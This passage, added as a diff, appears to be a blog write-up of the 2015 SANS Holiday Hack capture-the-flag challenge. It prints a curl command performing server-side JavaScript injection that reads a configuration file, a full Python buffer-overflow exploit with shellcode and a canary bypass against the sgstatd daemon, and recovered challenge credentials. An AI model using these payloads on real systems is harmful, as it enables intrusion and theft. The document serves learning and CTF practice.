+    <a href="/img/post/2015/holidayhack/THX1138.jpg" data-lightbox="default" data-title="THX 1138" >
+        <img src="/img/post/2015/holidayhack/THX1138.jpg" alt="THX 1138" >
+    </a>
+</figure>
+
+</p>
+
+<p>The following credentials could be recovered from the database.
+The SuperGnome admin louise seems to be a fan of the song <a href="https://www.youtube.com/watch?v=MbkY23wSL9c">Welcome Christmas</a> from the musical.</p>
+
+<pre><code>admin: StillSittingOnAShelf!
+louise: FahWhoRahMoose
+</code></pre>
+
+<h3 id="supergnome-4:fc53e74f05f8f7542d80a6ee08c867a6">Supergnome 4</h3>
+
+<p>The system was compromised via server side javascript injection in NodeJS.
+The initial credentials for a valid session are present in the firmware image.
+With a valid session id, simply upload a file and include the SSJS payload of your choice in the postproc variable.</p>
+
+<p>
+
+<figure class="fcenter">
+    <a href="/img/post/2015/holidayhack/SSJS_Injection.png" data-lightbox="default" data-title="Server-Side JavaScript Injection" >
+        <img src="/img/post/2015/holidayhack/SSJS_Injection.png" alt="Server-Side JavaScript Injection" >
+    </a>
+</figure>
+
+</p>
+
+<pre><code>curl -s -k -X 'POST' -b 'sessionid=QWnIchSxTmT8BIyHE5OL' \
+       -H 'Content-Type: multipart/form-data; boundary=---------------------------1353123760992125901018690058' \
+       --data-binary $'-----------------------------1353123760992125901018690058\x0d\x0aContent-Disposition: form-data; name=\&quot;postproc\&quot;\x0d\x0a\x0d\x0ares.end(require(\'fs\').readFileSync(\'files/gnome.conf\'))\x0d\x0a-----------------------------1353123760992125901018690058\x0d\x0aContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;stallowned.png\&quot;\x0d\x0aContent-Type: image/png\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------1353123760992125901018690058--\x0d\x0a' \
+    'http://52.192.152.132/files'
+</code></pre>
+
+<p>The above command reads the contents of gnome configuration file and sends it back to the attacker.
+Other handy payloads might be to open a reverse shell.</p>
+
+<p><div class="highlight"><pre><code class="language-ini" data-lang="ini"><span class="err">Gnome</span> <span class="err">Serial</span> <span class="err">Number:</span> <span class="err">BU22_1729_2716057</span>
+</code></pre></div>
+</p>
+
+<p>The serial number likely refers to Bending Unit 22, unit number 1729, serial number 2716057</p>
+
+<p>
+
+<figure class="fcenter fsmall">
+    <a href="/img/post/2015/holidayhack/BU22_1729_2716057.png" data-lightbox="default" data-title="Bender_Rodriguez" >
+        <img src="/img/post/2015/holidayhack/BU22_1729_2716057.png" alt="Bender_Rodriguez" >
+    </a>
+</figure>
+
+</p>
+
+<p>The following credentials could be recovered from the database.
+Nedford, the SuperGnome admin seems to be quite enthusiastic about his work.</p>
+
+<pre><code>admin: SittingOnAShelf
+nedford: AllIWantForXmasIsYourPresents
+</code></pre>
+
+<h3 id="supergnome-5:fc53e74f05f8f7542d80a6ee08c867a6">Supergnome 5</h3>
+
+<p>The vulnerability is in the sgstatd daemon running on port 4242/tcp.
+The target buffer is 100 bytes, yet the program read 200 bytes giving us a classic buffer overflow.
+A static stack canary should protect the vulnerable function.
+Unfortunately, it is static and can therefore be easily be added to the exploit.
+Furthermore, the canary includes a partial assembly instruction necessary to exploit the vulnerability <code>JMP ESP</code>.</p>
+
+<p>A compiled binary is present in the firmware image.
+Using this binary allows to adjust the addresses in the exploit.
+The remote exploit proof-of-concept code is listed <a href="#sgstatd-remote-exploit:f01f8c0644e5f5332f225b6c091c5a59">below</a>.</p>
+
+<p>
+
+<figure class="fcenter">
+    <a href="/img/post/2015/holidayhack/SG5-whoami.png" data-lightbox="default" data-title="Established remote shell on SuperGnome 5." >
+        <img src="/img/post/2015/holidayhack/SG5-whoami.png" alt="Established remote shell on SuperGnome 5." >
+    </a>
+</figure>
+
+</p>
+
+<p>The reverse shell is only executed with the unpriviledged nobody user&rsquo;s rights.
+Yet, we can access the gnome configuration because of poor access rights.</p>
+
+<p><div class="highlight"><pre><code class="language-ini" data-lang="ini"><span class="err">Gnome</span> <span class="err">Serial</span> <span class="err">Number:</span> <span class="err">4CKL3R43V4</span>
+</code></pre></div>
+</p>
+
+<p>No idea what this serial number might point to.
+It looks like leet speak for <code>ACK LE RAEVA</code>.</p>
+
+<p>The following credentials could be recovered from the database.
+The real Grinch has be uncovered!</p>
+
+<pre><code>admin: SittingOnAShelf
+sims: IAmTheRealGrinch!
+</code></pre>
+
+<h1 id="part-5-baby-it-s-gnome-outside-sinister-plot-and-attribution:fc53e74f05f8f7542d80a6ee08c867a6">Part 5: Baby, It’s Gnome Outside: Sinister Plot and Attribution</h1>
+
+<p>Each SuperGnome has got one unique packet stored in the files folder.
+The packet captures include SMTP traffic between a client and a server.
+All five emails are associate with the mail address <code>c@atnascorp.com</code>.</p>
+
+<h2 id="what-is-the-nefarious-plot-of-atnas-corporation:fc53e74f05f8f7542d80a6ee08c867a6">What is the nefarious plot of ATNAS Corporation?</h2>
+
+<p>All the recovered mails include hints to the plans of ATNAS Corporation.</p>
+
+<p>The mail on SuperGnome 3 provides an outline of the plot.</p>
+
+<blockquote>
+<p>Oh, and I&rsquo;ve heard that many of you are asking where the name ATNAS comes
+from.  Why, it&rsquo;s reverse SANTA, of course.  Instead of bringing presents on
+Christmas, we&rsquo;ll be stealing them!</p>
+</blockquote>
+
+<p>The mail on SuperGnome 4 includes a clear outline written by the mastermind.</p>
+
+<blockquote>
+<p>I vowed to finish what the Grinch had started, but to do it at a far larger
+scale.  Using the latest technology and a distributed channel of burglars,
+we&rsquo;d rob 2 million houses, grabbing their most precious gifts, and selling
+them on the open market.  We&rsquo;ll destroy Christmas as two million homes full
+of people all cry &ldquo;BOO-HOO&rdquo;, and we&rsquo;ll turn a handy profit on the whole
+deal.</p>
+</blockquote>
+
+<p>This is probably based on a childhood trauma suffered by the villain.
+The excerpt below from the mail on SuperGnome 3 is remarkably similar to the childhood experience of <a href="http://hero.wikia.com/wiki/Cindy_Lou_Who">Cindy-Lou Who</a>.</p>
+
+<blockquote>
+<p>If any children observe you in their houses that night, remember to tell
+them that you are actually &ldquo;Santy Claus&rdquo;, and that you need to send the
+specific items you are taking to your workshop for repair.  Describe it in a
+very friendly manner, get the child a drink of water, pat him or her on the
+head, and send the little moppet back to bed.</p>
+</blockquote>
+
+<p>The packet capture on SuperGnome 5 includes an email from the Grinch to the villain.
+He tries to apologize for his wrong doings a long time ago.</p>
+
+<h2 id="who-is-the-villain-behind-the-nefarious-plot:fc53e74f05f8f7542d80a6ee08c867a6">Who is the villain behind the nefarious plot?</h2>
+
+<p>The most interesting mail is stored on SuperGnome 4 in 20151203133815.zip.
+It is addressed to <code>psychdoctor@whovillepsychiatrists.com</code> and signed by <code>Cindy Lou Who</code>.</p>
+
+<p>Additional evidence might be included in the scrambled video image of the firmware.
+Each SuperGnome contains an image with white noise.
+These have been XOR and can therefore be reversed.
+This process can be easily achieved with a <a href="#restore-overlay-error:f01f8c0644e5f5332f225b6c091c5a59">script</a> using pillow&rsquo;s ImageMath.
+The restored video feed <a href="/img/post/2015/holidayhack/4_eval_xor.png">image</a> is still not very clear.</p>
+
+<p>With the information from the mail, we can compare the latest known image of Cindy-Lou Who with the restored image:</p>
+
+<p>
+
+<figure class="fcenter fsmall">
+    <a href="/img/post/2015/holidayhack/Cindy_Lou_Who_comparison.png" data-lightbox="default" data-title="Image comparison" >
+        <img src="/img/post/2015/holidayhack/Cindy_Lou_Who_comparison.png" alt="Image comparison" >
+    </a>
+</figure>
+
+</p>
+
+<h1 id="links:fc53e74f05f8f7542d80a6ee08c867a6">Links</h1>
+
+<h2 id="part-1:fc53e74f05f8f7542d80a6ee08c867a6">Part 1</h2>
+
+<ul>
+<li><a href="https://thepacketgeek.com/importing-packets-from-trace-files/">Importing packets from trace files with scapy</a></li>
+<li><a href="https://thepacketgeek.com/scapy-sniffing-with-custom-actions-part-1/">Scapy Sniffing with Custom Actions, Part 1 | thePacketGeek</a></li>
+</ul>
+
+<h2 id="part-2:fc53e74f05f8f7542d80a6ee08c867a6">Part 2</h2>
+
+<ul>
+<li><a href="https://pen-testing.sans.org/blog/2015/12/03/nosql-no-problem-pillaging-mongodb-for-fun-and-profit">NoSQL? No Problem! Pillaging MongoDB for Fun and Profit</a></li>
+</ul>
+
+<h2 id="part-3:fc53e74f05f8f7542d80a6ee08c867a6">Part 3</h2>
+
+<ul>
+<li><a href="https://www.shodan.io/search?query=SuperGnome&amp;language=en">shodan.io</a></li>
+<li><a href="https://pen-testing.sans.org/blog/pen-testing/2015/12/08/effective-shodan-searches">Getting the Most Out of Shodan Searches</a></li>
+</ul>
+
+<h2 id="part-4:fc53e74f05f8f7542d80a6ee08c867a6">Part 4</h2>
+
+<ul>
+<li><a href="http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html">HACKING NODEJS AND MONGODB</a></li>
+<li><a href="http://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html">ATTACKING NODEJS AND MONGODB - PART TO</a></li>
+<li><a href="https://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf">Server-Side JavaScript Injection</a></li>
+<li><a href="https://penturalabs.wordpress.com/2011/03/31/vulnerability-development-buffer-overflows-how-to-bypass-full-aslr/">Vulnerability Development: Buffer Overflows: How To Bypass ASLR…</a></li>
+<li><a href="https://github.com/jfoote/exploitable">GDB &lsquo;exploitable&rsquo; plugin</a></li>
+<li><a href="http://www.coresecurity.com/files/attachments/StackGuard.pdf">Four different tricks to bypass StackShield and StackGuard protection</a></li>
+<li><a href="https://gist.github.com/joswr1ght/a45d000ceaccf4cce6cb">Disable DEP/NX on Linux in Grub</a></li>
+</ul>
+
+<h1 id="scripts:fc53e74f05f8f7542d80a6ee08c867a6">Scripts</h1>
+
+<h2 id="decrypt-c-c-communication:fc53e74f05f8f7542d80a6ee08c867a6">Decrypt C&amp;C Communication</h2>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!env python2</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">packetCount</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">cmds</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">def</span> <span class="nf">customAction</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">packetCount</span>
+    <span class="n">packetCount</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">if</span> <span class="n">packet</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">DNSRR</span><span class="p">):</span>
+        <span class="n">cmds</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="n">DNSRR</span><span class="p">]</span><span class="o">.</span><span class="n">rdata</span><span class="p">)</span>
+        <span class="k">return</span>
+        <span class="k">return</span> <span class="s">&quot;Packet #</span><span class="si">%s</span><span class="s">: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">packetCount</span><span class="p">,</span> <span class="n">packet</span><span class="p">[</span><span class="n">DNSRR</span><span class="p">]</span><span class="o">.</span><span class="n">rdata</span><span class="p">)</span>
+        <span class="k">return</span> <span class="s">&quot;Packet #</span><span class="si">%s</span><span class="s">: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">packetCount</span><span class="p">,</span> <span class="n">packet</span><span class="o">.</span><span class="n">summary</span><span class="p">)</span>
+        <span class="k">return</span> <span class="s">&quot;Packet #</span><span class="si">%s</span><span class="s">: </span><span class="si">%s</span><span class="s"> ==&gt; </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">packetCount</span><span class="p">,</span> <span class="n">packet</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="n">packet</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span><span class="p">)</span>
+
+<span class="c">#filter_bpf = &#39;(dns ) &amp;&amp; (ip.src == 52.2.229.189)&#39;</span>
+<span class="n">filter_bpf</span> <span class="o">=</span> <span class="s">&#39;udp and port 53&#39;</span>
+<span class="n">packets</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="n">offline</span><span class="o">=</span><span class="s">&#39;giyh-capture.pcap&#39;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">customAction</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="n">filter_bpf</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">count</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">packets</span><span class="o">.</span><span class="n">summary</span><span class="p">)</span>
+
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="n">chunk_data</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+<span class="n">chunk_name</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+<span class="n">chunk_id</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">chunks</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="k">for</span> <span class="n">cmd</span> <span class="ow">in</span> <span class="n">cmds</span><span class="p">:</span>
+    <span class="n">cmd_dec</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+    <span class="c">#print(string.find(cmd_dec,&quot;FILE:&quot;))</span>
+    <span class="k">if</span> <span class="n">string</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">,</span><span class="s">&quot;NONE:&quot;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">elif</span> <span class="n">string</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">,</span><span class="s">&quot;FILE:&quot;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">string</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">,</span><span class="s">&quot;FILE:START_STATE&quot;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">rdx</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">,</span><span class="s">&quot;/&quot;</span><span class="p">)</span> 
+            <span class="n">chunk_name</span> <span class="o">=</span> <span class="n">cmd_dec</span><span class="p">[</span><span class="n">rdx</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">)]</span>
+
+            <span class="k">print</span><span class="p">(</span><span class="s">&quot;file chunk start: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">cmd_dec</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">&quot;file chunk start: (</span><span class="si">%d</span><span class="s">) </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">rdx</span><span class="p">,</span> <span class="n">chunk_name</span><span class="p">))</span>
+            <span class="n">chunk_id</span> <span class="o">=</span> <span class="mi">0</span>
+            <span class="n">chunk_data</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+        <span class="k">elif</span> <span class="n">string</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">,</span><span class="s">&quot;FILE:STOP&quot;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">&quot;file chunks </span><span class="si">%d</span><span class="s">...&quot;</span> <span class="o">%</span> <span class="n">chunk_id</span><span class="p">)</span>
+            <span class="n">chunks</span><span class="p">[</span><span class="n">chunk_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunk_data</span>
+            <span class="n">chunk_data</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+            <span class="n">chunk_name</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">chunk_id</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">)</span>
+            <span class="n">chunk_id</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="n">chunk_data</span> <span class="o">+=</span> <span class="n">cmd_dec</span><span class="p">[</span><span class="mi">5</span><span class="p">:]</span>
+
+    <span class="k">elif</span> <span class="n">string</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">,</span><span class="s">&quot;EXEC:&quot;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">string</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">,</span><span class="s">&quot;EXEC:START_STATE&quot;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">&quot;exec chunk start: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">cmd_dec</span><span class="p">)</span>
+            <span class="n">chunk_id</span> <span class="o">=</span> <span class="mi">0</span>
+            <span class="n">chunk_data</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+        <span class="k">elif</span> <span class="n">string</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">,</span><span class="s">&quot;EXEC:STOP&quot;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="c">#print(&quot;&gt;&gt;%s&lt;&lt;&quot; % (chunk))</span>
+            <span class="n">chunks</span><span class="p">[</span><span class="n">chunk_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunk_data</span>
+            <span class="n">chunk_data</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+            <span class="n">chunk_name</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="c">#print(&quot;&gt;&gt;%d:%s:%s&lt;&lt;&quot; % (chunk_id,chunk_name,cmd_dec))</span>
+            <span class="k">if</span> <span class="n">chunk_name</span> <span class="o">==</span> <span class="s">&quot;&quot;</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk_data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">chunk_name</span> <span class="o">=</span> <span class="n">cmd_dec</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">chunk_data</span> <span class="o">+=</span> <span class="n">cmd_dec</span><span class="p">[</span><span class="mi">5</span><span class="p">:]</span>
+            <span class="n">chunk_id</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">cmd_dec</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">chunks</span><span class="o">.</span><span class="n">iteritems</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">))</span>
+    <span class="n">fname</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">k</span> <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="n">isalnum</span><span class="p">())</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="s">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">),</span><span class="n">v</span><span class="p">[:</span><span class="mi">10</span><span class="p">])</span>
+</code></pre></div>
+</p>
+
+<h2 id="sgstatd-remote-exploit:fc53e74f05f8f7542d80a6ee08c867a6">sgstatd Remote Exploit</h2>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+
+<span class="c">#TARGET</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s">&quot;54.233.105.81&quot;</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">4242</span>
+
+<span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">payload</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">):</span>
+  <span class="n">out</span> <span class="o">=</span> <span class="n">payload</span>
+  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">out</span><span class="p">),</span><span class="n">out</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+  <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">set follow-fork-mode child</span>
+<span class="sd">break *0x80493c4</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="n">shellcode1</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xCC</span><span class="s">&quot;</span>
+<span class="n">shellcode2</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xeb\xAE</span><span class="s">&quot;</span> \
+        <span class="s">&quot;</span><span class="se">\xe8\xAB\xff\xff\xff</span><span class="s">&quot;</span>
+
+<span class="n">eip</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="mh">0x80493b6</span><span class="p">)</span> <span class="c">#JMP ESP</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="mh">0xe4ffffe4</span><span class="p">)</span>
+<span class="n">ebp</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="mh">0xbff7b0ac</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xCC</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">104</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode1</span><span class="p">))</span> <span class="o">+</span><span class="n">shellcode1</span> <span class="o">+</span><span class="n">canary</span> <span class="o">+</span><span class="n">ebp</span> <span class="o">+</span><span class="n">eip</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">+</span><span class="n">shellcode2</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xCC</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">200</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span> <span class="c">## fill target buffer</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span> <span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span><span class="n">target_port</span><span class="p">))</span>
+<span class="k">if</span> <span class="n">sock</span><span class="p">:</span>
+  <span class="n">msg</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">51</span><span class="p">)</span>
+  <span class="n">msg</span> <span class="o">+=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">45</span><span class="p">)</span>
+  <span class="n">msg</span> <span class="o">+=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span>
+  <span class="n">msg</span> <span class="o">+=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span>
+  <span class="n">msg</span> <span class="o">+=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>
+  <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+
+  <span class="n">ret</span> <span class="o">=</span> <span class="n">send_data</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">&quot;X&quot;</span><span class="p">)</span>
+
+  <span class="n">msg</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+  <span class="n">sleep</span><span class="p">(</span><span class="mf">60.0</span> <span class="o">/</span> <span class="mf">1000.0</span><span class="p">)</span>
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">22</span><span class="p">):</span>
+    <span class="n">msg</span> <span class="o">+=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">60.0</span> <span class="o">/</span> <span class="mf">1000.0</span><span class="p">)</span>
+  <span class="n">msg</span> <span class="o">+=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+  <span class="n">sleep</span><span class="p">(</span><span class="mf">60.0</span> <span class="o">/</span> <span class="mf">1000.0</span><span class="p">)</span>
+  <span class="n">msg</span> <span class="o">+=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">75</span><span class="p">)</span>
+  <span class="n">sleep</span><span class="p">(</span><span class="mf">60.0</span> <span class="o">/</span> <span class="mf">1000.0</span><span class="p">)</span>
+  <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+
+  <span class="n">waitit</span> <span class="o">=</span> <span class="mi">1</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">&quot;# Waiting </span><span class="si">%d</span><span class="s"> seconds&quot;</span> <span class="o">%</span><span class="p">(</span><span class="n">waitit</span><span class="p">))</span>
+  <span class="n">sleep</span><span class="p">(</span><span class="n">waitit</span><span class="p">)</span>
+
+  <span class="n">msg</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
+  <span class="n">sleep</span><span class="p">(</span><span class="mf">60.0</span> <span class="o">/</span> <span class="mf">1000.0</span><span class="p">)</span>
+  <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+
+  <span class="n">ret</span> <span class="o">=</span> <span class="n">send_data</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">exploit</span><span class="p">)</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+</p>
+
+<h2 id="restore-overlay-error:fc53e74f05f8f7542d80a6ee08c867a6">Restore Overlay Error</h2>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">ImageChops</span><span class="p">,</span> <span class="n">ImageMath</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">&quot;please provide an input file names&quot;</span><span class="p">)</span>
+    <span class="nb">exit</span><span class="p">()</span>
+
+<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">walk</span><span class="p">,</span> <span class="n">path</span>
+
+<span class="n">mydir</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
